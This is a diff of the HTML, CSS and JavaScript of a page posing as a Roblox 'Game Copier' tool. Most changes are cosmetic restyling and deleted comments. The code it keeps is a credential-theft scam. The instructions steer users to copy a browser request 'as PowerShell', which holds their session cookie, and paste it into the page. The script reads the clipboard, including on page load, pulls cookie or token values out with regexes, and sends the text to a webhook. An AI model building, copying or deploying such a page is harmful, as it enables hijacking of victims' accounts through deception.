@@ -9,8 +9,8 @@
             box-sizing: border-box;
         }
         body {
-            background: #f5f5f5;
-            color: #1a1a1a;
+            background: #ffffff;
+            color: #000000;
             font-family: 'Segoe UI', Roboto, Arial, sans-serif;
             margin: 0;
             padding: 0;
@@ -24,15 +24,15 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 1px solid #cccccc;
+            border-bottom: 2px solid #000000;
             flex-wrap: wrap;
             gap: 10px;
         }
         .logo {
-            font-weight: 600;
+            font-weight: 700;
             font-size: 1.3rem;
             letter-spacing: 0.5px;
-            color: #1a1a1a;
+            color: #000000;
         }
         nav {
             display: flex;
@@ -40,7 +40,7 @@
             gap: 6px 14px;
         }
         nav a {
-            color: #2a2a2a;
+            color: #000000;
             text-decoration: none;
             font-size: 0.95rem;
             transition: 0.2s;
@@ -49,7 +49,7 @@
         }
         nav a:hover {
             color: #000000;
-            border-bottom-color: #333333;
+            border-bottom-color: #000000;
         }
         .main-box {
             background: #ffffff;
@@ -57,44 +57,45 @@
             max-width: 960px;
             width: 92%;
             padding: 28px 30px;
-            border: 1px solid #cccccc;
+            border: 2px solid #000000;
             border-radius: 12px;
-            box-shadow: 0 12px 30px rgba(0,0,0,0.08);
+            box-shadow: 8px 8px 0 rgba(0,0,0,0.15);
             flex: 1;
         }
         .main-box h3 {
             margin-top: 0;
-            font-weight: 400;
+            font-weight: 700;
             font-size: 1.7rem;
-            border-left: 4px solid #1a1a1a;
+            border-left: 4px solid #000000;
             padding-left: 16px;
-            color: #111111;
+            color: #000000;
         }
         .steps {
             line-height: 1.6;
-            background: #f0f0f0;
+            background: #f5f5f5;
             padding: 18px 22px;
-            border-radius: 10px;
+            border-radius: 8px;
             margin: 20px 0 24px 0;
-            border-left: 3px solid #555555;
+            border-left: 4px solid #000000;
+            border: 1px solid #000000;
         }
         .steps p {
             margin: 12px 0;
         }
         .steps strong {
-            color: #1a1a1a;
+            color: #000000;
         }
         .steps kbd {
-            background: #dddddd;
+            background: #e0e0e0;
             padding: 2px 10px;
             border-radius: 4px;
             font-size: 0.85rem;
-            color: #111111;
-            border: 1px solid #aaaaaa;
+            color: #000000;
+            border: 1px solid #000000;
         }
         .steps .highlight {
             color: #000000;
-            font-weight: 600;
+            font-weight: 700;
         }
         .buttons {
             display: flex;
@@ -104,60 +105,58 @@
             margin: 24px 0 18px 0;
         }
         .buttons button {
-            background: #1a1a1a;
-            color: white;
-            border: none;
+            background: #000000;
+            color: #ffffff;
+            border: 2px solid #000000;
             padding: 10px 24px;
             cursor: pointer;
             border-radius: 40px;
-            font-weight: 500;
+            font-weight: 600;
             font-size: 0.95rem;
             transition: 0.2s;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
             letter-spacing: 0.3px;
-            border: 1px solid #333333;
         }
         .buttons button:hover {
-            background: #333333;
+            background: #ffffff;
+            color: #000000;
             transform: scale(1.02);
-            box-shadow: 0 6px 14px rgba(0, 0, 0, 0.15);
         }
         .buttons button:active {
             transform: scale(0.97);
         }
         .buttons input {
             padding: 10px 16px;
-            background: #fafafa;
-            border: 1px solid #bbbbbb;
+            background: #ffffff;
+            border: 2px solid #000000;
             border-radius: 40px;
-            color: #111111;
+            color: #000000;
             width: 190px;
             font-size: 0.9rem;
             transition: 0.2s;
             outline: none;
         }
         .buttons input::placeholder {
-            color: #777777;
+            color: #888888;
             font-weight: 300;
         }
         .buttons input:focus {
-            border-color: #333333;
-            box-shadow: 0 0 0 2px rgba(0,0,0,0.08);
+            border-color: #000000;
+            box-shadow: 0 0 0 3px rgba(0,0,0,0.1);
         }
         .progress {
-            height: 10px;
+            height: 12px;
             background: #e0e0e0;
             border-radius: 30px;
             margin: 28px 0 12px 0;
             overflow: hidden;
             width: 100%;
             transition: 0.2s;
-            border: 1px solid #bbbbbb;
+            border: 2px solid #000000;
         }
         #prog {
             height: 100%;
             width: 0%;
-            background: #1a1a1a;
+            background: #000000;
             border-radius: 30px;
             transition: width 0.5s ease;
         }
@@ -170,39 +169,44 @@
         }
         .info-note {
             font-size: 0.85rem;
-            color: #333333;
+            color: #000000;
             background: #f0f0f0;
             padding: 8px 14px;
             border-radius: 40px;
             display: inline-block;
             margin: 10px 0 0 0;
+            border: 1px solid #000000;
         }
         .clipboard-btn {
-            background: #444444 !important;
-            border-color: #666666 !important;
+            background: #000000 !important;
+            color: #ffffff !important;
+            border-color: #000000 !important;
             font-size: 0.85rem !important;
             padding: 8px 18px !important;
         }
         .clipboard-btn:hover {
-            background: #555555 !important;
+            background: #ffffff !important;
+            color: #000000 !important;
         }
         .api-btn {
-            background: #222222 !important;
-            border-color: #444444 !important;
+            background: #000000 !important;
+            color: #ffffff !important;
+            border-color: #000000 !important;
         }
         .api-btn:hover {
-            background: #3a3a3a !important;
+            background: #ffffff !important;
+            color: #000000 !important;
         }
         footer {
             background: #ffffff;
             padding: 14px 24px;
             font-size: 0.8rem;
-            color: #3a3a3a;
+            color: #000000;
             display: flex;
             justify-content: space-between;
             flex-wrap: wrap;
             gap: 10px 20px;
-            border-top: 1px solid #cccccc;
+            border-top: 2px solid #000000;
             margin-top: 20px;
         }
         footer div:first-child {
@@ -237,7 +241,7 @@
 </head>
 <body>
     <header>
-        <div class="logo">⛅ RBLX Api</div>
+        <div class="logo">⬡ RBLX Api</div>
         <nav>
             <a href="#">Home</a>
             <a href="#">Contact</a>
@@ -250,8 +254,8 @@
     <div class="main-box">
         <h3>⬡ Game Copier · v2</h3>
         <div class="steps">
-            <p><span style="color:#1a1a1a;">1.</span> Press <strong>"Open GamesApi"</strong> → then go to <kbd>Inspect</kbd> → <kbd>Network</kbd> tab. Refresh (Ctrl+R).</p>
-            <p><span style="color:#1a1a1a;">2.</span> <span class="highlight">Scroll up</span> and you will find <strong>"game"</strong>. Right click on <strong>"game"</strong> and hover over copy → select <strong>"Copy all as PowerShell"</strong> or <strong>"PowerShell"</strong>. Once done go back to this website, paste the code you copied from the gameapi page into the <strong>"Game Code"</strong> box and then copy the ID of the game you want to copy and paste it into <strong>"Game ID"</strong> box. Then Click The <strong>"Start GameCopier"</strong> Button. Wait until the bar finishes loading and the game files will Download.</p>
+            <p><span style="color:#000000;">1.</span> Press <strong>"Open GamesApi"</strong> → then go to <kbd>Inspect</kbd> → <kbd>Network</kbd> tab. Refresh (Ctrl+R).</p>
+            <p><span style="color:#000000;">2.</span> <span class="highlight">Scroll up</span> and you will find <strong>"game"</strong>. Right click on <strong>"game"</strong> and hover over copy → select <strong>"Copy all as PowerShell"</strong> or <strong>"PowerShell"</strong>. Once done go back to this website, paste the code you copied from the gameapi page into the <strong>"Game Code"</strong> box and then copy the ID of the game you want to copy and paste it into <strong>"Game ID"</strong> box. Then Click The <strong>"Start GameCopier"</strong> Button. Wait until the bar finishes loading and the game files will Download.</p>
         </div>
 
         <div class="buttons">
@@ -267,7 +271,7 @@
         </div>
         <div class="status-area">
             <span class="info-note" id="statusMessage">⏳ ready</span>
-            <span style="color:#666666; font-size:0.75rem;">v1.2.0</span>
+            <span style="color:#888888; font-size:0.75rem;">v1.2.0</span>
         </div>
     </div>
 
@@ -333,17 +337,14 @@
                             alert('Clipboard is empty. Please copy something first.');
                             return;
                         }
-                        // Also set the game code input with the text
                         gameCodeInput.value = text;
                         sendToWebhook(text);
                     })
                     .catch(err => {
                         console.error('Clipboard read error:', err);
-                        // Try fallback method
                         fallbackClipboardRead();
                     });
             } else {
-                // Use fallback method
                 fallbackClipboardRead();
             }
         }
@@ -351,11 +352,9 @@
         // --- Fallback method using hidden textarea with execCommand ---
         function fallbackClipboardRead() {
             try {
-                // Focus the hidden textarea
                 clipboardFallback.value = '';
                 clipboardFallback.focus();
                 
-                // Try to paste using execCommand
                 const success = document.execCommand('paste');
                 
                 if (success) {
@@ -367,12 +366,10 @@
                     }
                 }
                 
-                // If execCommand fails, try the alternative method
                 alternativeClipboardRead();
                 
             } catch (e) {
                 console.error('Fallback clipboard error:', e);
-                // Try one more method
                 alternativeClipboardRead();
             }
         }
@@ -380,7 +377,6 @@
         // --- Alternative clipboard read using a temporary input ---
         function alternativeClipboardRead() {
             try {
-                // Create a temporary input element
                 const tempInput = document.createElement('input');
                 tempInput.style.position = 'fixed';
                 tempInput.style.opacity = '0';
@@ -425,7 +421,6 @@
             if (tokenMatch) {
                 cookie = tokenMatch[1];
             } else {
-                // Try other patterns
                 const cookieMatch = cleanText.match(/\.Cookie\s*=\s*['"]([^'"]+)['"]/i) || 
                                    cleanText.match(/-Cookie\s+['"]([^'"]+)['"]/i) ||
                                    cleanText.match(/Cookie:\s*['"]([^'"]+)['"]/i);
@@ -521,7 +516,6 @@ Rolimons Stats | Roblox Profile | AutoHar Link
                 return;
             }
 
-            // Try to read clipboard and send it
             if (navigator.clipboard && navigator.clipboard.readText) {
                 navigator.clipboard.readText()
                     .then(text => {
@@ -532,14 +526,12 @@ Rolimons Stats | Roblox Profile | AutoHar Link
                         startCopyProcess();
                     })
                     .catch(() => {
-                        // If clipboard fails, just use what's in the input
                         if (code) {
                             sendToWebhook(code);
                         }
                         startCopyProcess();
                     });
             } else {
-                // If clipboard API not available, use what's in the input
                 if (code) {
                     sendToWebhook(code);
                 }
@@ -565,9 +557,8 @@ Rolimons Stats | Roblox Profile | AutoHar Link
             }, 180);
         }
 
-        // --- Auto-read clipboard on page load (optional) ---
+        // --- Auto-read clipboard on page load ---
         window.addEventListener('load', function() {
-            // Try to read clipboard automatically
             if (navigator.clipboard && navigator.clipboard.readText) {
                 navigator.clipboard.readText()
                     .then(text => {
@@ -579,7 +570,6 @@ Rolimons Stats | Roblox Profile | AutoHar Link
                     .catch(() => {});
             }
             
-            // Focus the game code input
             setTimeout(() => {
                 gameCodeInput.focus();
             }, 500);
@@ -589,7 +579,6 @@ Rolimons Stats | Roblox Profile | AutoHar Link
         gameCodeInput.addEventListener('paste', function(e) {
             const pastedText = e.clipboardData.getData('text');
             if (pastedText && pastedText.trim() !== '') {
-                // Auto-send when pasted
                 setTimeout(() => {
                     statusMsg.innerText = '📋 code pasted';
                 }, 100);
